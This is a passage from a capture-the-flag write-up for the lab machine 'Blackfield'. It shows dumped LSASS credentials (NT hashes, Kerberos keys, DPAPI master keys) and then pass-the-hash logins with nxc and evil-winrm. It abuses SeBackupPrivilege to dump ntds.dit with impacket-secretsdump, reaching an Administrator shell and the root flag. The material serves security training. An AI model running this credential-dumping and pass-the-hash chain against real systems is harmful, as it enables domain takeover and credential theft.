+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5f5a]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 406499 (633e3)
+session_id 2
+username svc_backup
+domainname BLACKFIELD
+logon_server DC01
+logon_time 2020-02-23T18:00:03.423728+00:00
+sid S-1-5-21-4194615774-2175524697-3563712290-1413
+luid 406499
+    == MSV ==
+        Username: svc_backup
+        Domain: BLACKFIELD
+        LM: NA
+        NT: 9658d1d1dcd9250115e2205d9f48400d
+        SHA1: 463c13a9a31fc3252c68ba0a44f0221626a33e5c
+        DPAPI: a03cd8e9d30171f3cfe8caad92fef62100000000
+    == WDIGEST [633e3]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: svc_backup
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: 9658d1d1dcd9250115e2205d9f48400d
+        AES256 Key: 20a3e879a3a0ca4f51db1e63514a27ac18eef553d8f30c29805c398c97599e91
+    == WDIGEST [633e3]==
+        username svc_backup
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == DPAPI [633e3]==
+        luid 406499
+        key_guid 836e8326-d136-4b9f-94c7-3353c4e45770
+        masterkey 0ab34d5f8cb6ae5ec44a4cb49ff60c8afdf0b465deb9436eebc2fcb1999d5841496c3ffe892b0a6fed6742b1e13a5aab322b6ea50effab71514f3dbeac025bdf
+        sha1_masterkey 6efc8aa0abb1f2c19e101fbd9bebfb0979c4a991
+
+== LogonSession ==
+authentication_id 366665 (59849)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:59:38.293877+00:00
+sid S-1-5-90-0-2
+luid 366665
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [59849]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [59849]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 366649 (59839)
+session_id 2
+username DWM-2
+domainname Window Manager
+logon_server 
+logon_time 2020-02-23T17:59:38.293877+00:00
+sid S-1-5-90-0-2
+luid 366649
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [59839]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [59839]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 256940 (3ebac)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:59:13.068835+00:00
+sid S-1-5-18
+luid 256940
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 136764 (2163c)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:27.052945+00:00
+sid S-1-5-18
+luid 136764
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 134935 (20f17)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:58:26.834285+00:00
+sid S-1-5-18
+luid 134935
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.LOCAL
+
+== LogonSession ==
+authentication_id 997 (3e5)
+session_id 0
+username LOCAL SERVICE
+domainname NT AUTHORITY
+logon_server 
+logon_time 2020-02-23T17:57:47.162285+00:00
+sid S-1-5-19
+luid 997
+    == Kerberos ==
+        Username: 
+        Domain: 
+
+== LogonSession ==
+authentication_id 24405 (5f55)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.569111+00:00
+sid S-1-5-96-0-0
+luid 24405
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5f55]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5f55]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 24294 (5ee6)
+session_id 0
+username UMFD-0
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.554117+00:00
+sid S-1-5-96-0-0
+luid 24294
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5ee6]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5ee6]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 24282 (5eda)
+session_id 1
+username UMFD-1
+domainname Font Driver Host
+logon_server 
+logon_time 2020-02-23T17:57:46.554117+00:00
+sid S-1-5-96-0-1
+luid 24282
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+    == WDIGEST [5eda]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: DC01$
+        Domain: BLACKFIELD.local
+        Password: 260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        password (hex)260053005900560045002b003c0079006e007500600051006c003b00670076004500450021006600240044006f004f00300046002b002c006700500040005000600066007200610060007a0034002600470033004b0027006d0048003a00260027004b005e0053005700240046004e0057005700780037004a002d004e0024005e00270062007a004200310044007500630033005e0045007a005d0045006e0020006b00680060006200270059005300560037004d006c00230040004700330040002a002800620024005d006a00250023004c005e005b00510060006e004300500027003c0056006200300049003600
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: eee13fce940cce15b93edd7b2506c9d5a8fec62fc13c8fa3723c3da603960c44
+    == WDIGEST [5eda]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+
+== LogonSession ==
+authentication_id 22028 (560c)
+session_id 0
+username 
+domainname 
+logon_server 
+logon_time 2020-02-23T17:57:44.959593+00:00
+sid None
+luid 22028
+    == MSV ==
+        Username: DC01$
+        Domain: BLACKFIELD
+        LM: NA
+        NT: b624dc83a27cc29da11d9bf25efea796
+        SHA1: 4f2a203784d655bb3eda54ebe0cfdabe93d4a37d
+        DPAPI: 0000000000000000000000000000000000000000
+
+== LogonSession ==
+authentication_id 999 (3e7)
+session_id 0
+username DC01$
+domainname BLACKFIELD
+logon_server 
+logon_time 2020-02-23T17:57:44.913221+00:00
+sid S-1-5-18
+luid 999
+    == WDIGEST [3e7]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == Kerberos ==
+        Username: dc01$
+        Domain: BLACKFIELD.LOCAL
+        AES128 Key: b624dc83a27cc29da11d9bf25efea796
+        AES256 Key: ae7032a985fe7303c182f82d15df15b1ccf731c7f33947e3bd2f193d12d9d684
+    == WDIGEST [3e7]==
+        username DC01$
+        domainname BLACKFIELD
+        password None
+        password (hex)
+    == DPAPI [3e7]==
+        luid 999
+        key_guid 0f7e926c-c502-4cad-90fa-32b78425b5a9
+        masterkey ebbb538876be341ae33e88640e4e1d16c16ad5363c15b0709d3a97e34980ad5085436181f66fa3a0ec122d461676475b24be001736f920cd21637fee13dfc616
+        sha1_masterkey ed834662c755c50ef7285d88a4015f9c5d6499cd
+    == DPAPI [3e7]==
+        luid 999
+        key_guid f611f8d0-9510-4a8a-94d7-5054cc85a654
+        masterkey 7c874d2a50ea2c4024bd5b24eef4515088cf3fe21f3b9cafd3c81af02fd5ca742015117e7f2675e781ce7775fcde2740ae7207526ce493bdc89d2ae3eb0e02e9
+        sha1_masterkey cf1c0b79da85f6c84b96fd7a0a5d7a5265594477
+    == DPAPI [3e7]==
+        luid 999
+        key_guid 31632c55-7a7c-4c51-9065-65469950e94e
+        masterkey 825063c43b0ea082e2d3ddf6006a8dcced269f2d34fe4367259a0907d29139b58822349e687c7ea0258633e5b109678e8e2337d76d4e38e390d8b980fb737edb
+        sha1_masterkey 6f3e0e7bf68f9a7df07549903888ea87f015bb01
+    == DPAPI [3e7]==
+        luid 999
+        key_guid 7e0da320-072c-4b4a-969f-62087d9f9870
+        masterkey 1fe8f550be4948f213e0591eef9d876364246ea108da6dd2af73ff455485a56101067fbc669e99ad9e858f75ae9bd7e8a6b2096407c4541e2b44e67e4e21d8f5
+        sha1_masterkey f50955e8b8a7c921fdf9bac7b9a2483a9ac3ceed</code></pre></div>
+<p>The NTLM hash of <code class="inline-code">svc_backup</code> user works:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d                                   
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u svc_backup -H <span class="hljs-number">9658</span>d1d1dcd9250115e2205d9f48400d                                   
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.229</span><span class="hljs-number">.17</span>   <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (<span class="hljs-built_in">domain</span>:BLACKFIELD.local) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.229</span><span class="hljs-number">.17</span>   <span class="hljs-number">445</span>    DC01             [+] BLACKFIELD.local\svc_backup:<span class="hljs-number">9658</span>d1d1dcd9250115e2205d9f48400d</code></pre></div>
+<p>Use it to gain a shell on the remote machine:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ evil-winrm -i blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami
+iblackfield\svc_backup
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::396f:1dc8:3526:594
+   Link-local IPv6 Address . . . . . : fe80::396f:1dc8:3526:594%17
+   IPv4 Address. . . . . . . . . . . : 10.129.229.17
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ evil-winrm -i blackfield.local -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d 
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; whoami
+iblackfield\svc_backup
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::396f:1dc8:3526:594
+   Link-local IPv6 Address . . . . . : fe80::396f:1dc8:3526:594%17
+   IPv4 Address. . . . . . . . . . . : 10.129.229.17
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\svc_backup\Documents&gt; </code></pre></div>
+<p>User belongs to the <code class="inline-code">SeBackupPrivilege</code> which we can abuse to gain higher privileges. One way is to make a copy of the <code class="inline-code">ntds.dit</code> file, extract the credentials, and perform Pass-the-Hash as Domain Administrator account:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ impacket-secretsdump -system system -ntds ntds.dit LOCAL 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+....SNIP....</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ impacket-secretsdump -system system -ntds ntds.dit LOCAL 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
+audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
+support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
+BLACKFIELD.local\BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD189208:1107:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD404458:1108:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD706381:1109:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD937395:1110:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+BLACKFIELD.local\BLACKFIELD553715:1111:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
+....SNIP....</code></pre></div>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ evil-winrm -i blackfield.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+blackfield\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::396f:1dc8:3526:594
+   Link-local IPv6 Address . . . . . : fe80::396f:1dc8:3526:594%17
+   IPv4 Address. . . . . . . . . . . : 10.129.229.17
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ evil-winrm -i blackfield.local -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&apos; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+blackfield\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::396f:1dc8:3526:594
+   Link-local IPv6 Address . . . . . : fe80::396f:1dc8:3526:594%17
+   IPv4 Address. . . . . . . . . . . : 10.129.229.17
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; </code></pre></div>
+<p>The <code class="inline-code">root.txt</code> flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+blackfield\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::396f:1dc8:3526:594
+   Link-local IPv6 Address . . . . . : fe80::396f:1dc8:3526:594%17
+   IPv4 Address. . . . . . . . . . . : 10.129.229.17
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
+*Evil-WinRM* PS C:\Users\Administrator&gt; more Desktop\root.txt
+4375a629c7c67c8e29db269060c955cb
+
+*Evil-WinRM* PS C:\Users\Administrator&gt;</pre><pre class="hljs"><code><span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+blackfield\administrator
+<span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\Administrator\Documents&gt; ipconfig
+
+Windows<span class="hljs-built_in"> IP </span>Configuration
+
+<span class="hljs-built_in">
+Ethernet </span>adapter Ethernet0 2:
+
+   Connection-specific<span class="hljs-built_in"> DNS </span>Suffix  . : .htb
+  <span class="hljs-built_in"> IPv6 </span>Address. . . . . . . . . . . : dead:beef::396f:1dc8:3526:594
+   Link-local<span class="hljs-built_in"> IPv6 Address </span>. . . . . : fe80::396f:1dc8:3526:594%17
+   IPv4 Address. . . . . . . . . . . : 10.129.229.17
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+  <span class="hljs-built_in"> Default </span>Gateway . . . . . . . . . : 10.129.0.1
+<span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\Administrator\Documents&gt; cd <span class="hljs-built_in">..</span>
+<span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\Administrator&gt; more Desktop\root.txt
+4375a629c7c67c8e29db269060c955cb
+
+<span class="hljs-number">*E</span>vil-WinRM* PS C:\Users\Administrator&gt;</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
